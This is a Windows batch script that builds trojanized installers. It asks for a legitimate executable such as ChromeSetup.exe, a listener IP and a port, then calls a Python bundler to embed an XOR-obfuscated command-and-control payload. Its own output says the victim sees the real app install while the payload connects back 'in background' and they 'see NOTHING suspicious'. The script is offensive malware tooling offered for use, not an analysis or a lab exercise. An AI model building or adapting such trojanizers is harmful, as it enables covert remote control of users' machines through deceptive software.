@echo off
echo ========================================
echo  C2 PATCH MODE Builder - Windows
echo ========================================
echo.
echo This will embed your C2 payload inside
echo a legitimate application (ChromeSetup.exe, etc.)
echo.
echo The user will see the original app install
echo normally while your C2 connects in background!
echo.

:: Demander le fichier à patcher
set /p PATCH_FILE="Enter FULL path to .exe to patch: "

:: Vérifier que le fichier existe
if not exist "%PATCH_FILE%" (
    echo.
    echo ERROR: File not found: %PATCH_FILE%
    echo.
    echo Example paths:
    echo   C:\Users\YourName\Desktop\ChromeSetup.exe
    echo   C:\Users\YourName\Downloads\DiscordSetup.exe
    echo.
    pause
    exit /b 1
)

echo.
echo Target file found: %PATCH_FILE%

:: Obtenir juste le nom du fichier
for %%F in ("%PATCH_FILE%") do set FILENAME=%%~nxF
echo Filename: %FILENAME%

:: Demander IP
echo.
set /p LISTENER_IP="Enter Listener IP (ex: 192.168.1.40): "
if "%LISTENER_IP%"=="" (
    echo ERROR: IP required!
    pause
    exit /b 1
)

:: Demander Port
set /p LISTENER_PORT="Enter Listener Port (default 4444): "
if "%LISTENER_PORT%"=="" set LISTENER_PORT=4444

:: Obfuscation recommandé pour PATCH
set OBF_LEVEL=2

echo.
echo ========================================
echo Building PATCHED payload...
echo ========================================
echo Target: %FILENAME%
echo IP: %LISTENER_IP%
echo Port: %LISTENER_PORT%
echo Obfuscation: Level %OBF_LEVEL% (XOR + Delays)
echo.
echo This may take 30-60 seconds...
echo.

:: Build avec patch - utiliser raw string pour le path
python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('%LISTENER_IP%', %LISTENER_PORT%, %OBF_LEVEL%, 'windows', r'%PATCH_FILE%')"

if %ERRORLEVEL% EQU 0 (
    echo.
    echo ========================================
    echo  SUCCESS!
    echo ========================================
    echo Patched file: dist\%FILENAME%
    echo.
    echo Original size: 
    dir "%PATCH_FILE%" | findstr /C:"%FILENAME%"
    echo.
    echo Patched size:
    dir dist\%FILENAME%
    echo.
    echo ========================================
    echo What happens when user runs it:
    echo   1. They double-click %FILENAME%
    echo   2. Original app installs normally
    echo   3. C2 connects to you in background
    echo   4. They see NOTHING suspicious!
    echo ========================================
) else (
    echo.
    echo ========================================
    echo  BUILD FAILED!
    echo ========================================
    echo Check the error messages above
)

echo.
pause
